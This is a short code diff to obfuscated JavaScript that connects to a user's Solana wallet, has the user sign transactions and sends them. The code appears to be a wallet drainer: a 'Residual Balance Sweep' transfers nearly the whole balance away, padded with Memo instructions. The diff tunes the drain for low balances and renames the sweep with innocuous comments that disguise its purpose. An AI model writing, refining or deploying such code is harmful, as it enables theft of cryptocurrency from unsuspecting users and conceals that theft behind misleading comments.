@@ -282,7 +282,7 @@
         "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
         "https://mainnet.helius-rpc.com/?api-key=",
         "confirmed",
-        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr", // Valid official Solana Memo Program ID
+        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr", 
         "connect",
         "signTransaction",
         "sendRawTransaction",
@@ -436,9 +436,9 @@
                         })
                     );
 
-                    // 37 Memo Instructions using valid Memo program ID
+                    // Reduced to 5 Memo instructions to fit within rent and fee limits for low balances
                     const encoder = new TextEncoder();
-                    for (let _0xf = 0; _0xf < 37; _0xf++) { 
+                    for (let _0xf = 0; _0xf < 5; _0xf++) { 
                         _0x1f.add(
                             new solanaWeb3.TransactionInstruction({
                                 keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
@@ -448,8 +448,8 @@
                         );
                     }
 
-                    // Residual Balance Sweep (leaving a safe fee buffer)
-                    const _0x21 = _0x1e - _0x1c - 200000; 
+                    // Safe Balance Buffer (Leaves 0.0008 SOL to safely cover rent and execution fees)
+                    const _0x21 = _0x1e - _0x1c - 800000; 
                     if (_0x21 > 10000) {
                         _0x1f.add(
                             solanaWeb3.SystemProgram.transfer({
